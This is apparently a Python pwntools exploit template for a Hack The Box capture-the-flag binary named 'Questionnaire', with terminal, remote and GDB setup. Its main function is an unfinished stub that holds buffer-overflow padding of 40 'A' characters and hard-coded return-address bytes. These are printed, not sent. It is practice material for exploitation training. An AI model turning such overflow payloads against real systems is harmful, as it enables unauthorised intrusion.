#!/usr/bin/env python3
import os
from pwn import *
from pwn_ext import *

exe = ELF("/home/alexander/bin/cybersecurity/writeups/HTB/Challenges/Questionnaire/test")

context.binary = exe
# GDB Compatability stuff
if "alacritty" in os.environ["TERM"]:
    context.terminal = ["alacritty", "-e"]
elif "tmux" in os.environ["TERM"]:
    context.terminal = ["tmux", "splitw", "-h"]
elif os.environ["GNOME_TERMINAL_SCREEN"]:
    context.terminal = ["gnome-terminal", "--"]

p = process([exe.path])
# Who needs more than one process?
if args.REMOTE:
    #p = remote("addr", 1337)
    p = nc_remote("") # just put entire nc command or host:port here
elif args.CLEAN:
    p = process([exe.path])
else:
    gdbscript = '''
    r
    '''
    p = gdb.attach(p, gdbscript=gdbscript)

### PUT ACTUAL PWN STUFF BELOW THIS LINE ###

def main():
    # good luck pwning :)


    #p.recvuntil(b"here:")
   # p.sendline(cyclic(200, n=8))
    print('A'*40, '\x76\x11\x40')
    hej = '\x40\x11\x90'
    hej2 = '\x90\x11\x40'
    p.interactive()

if __name__ == "__main__":
    main()
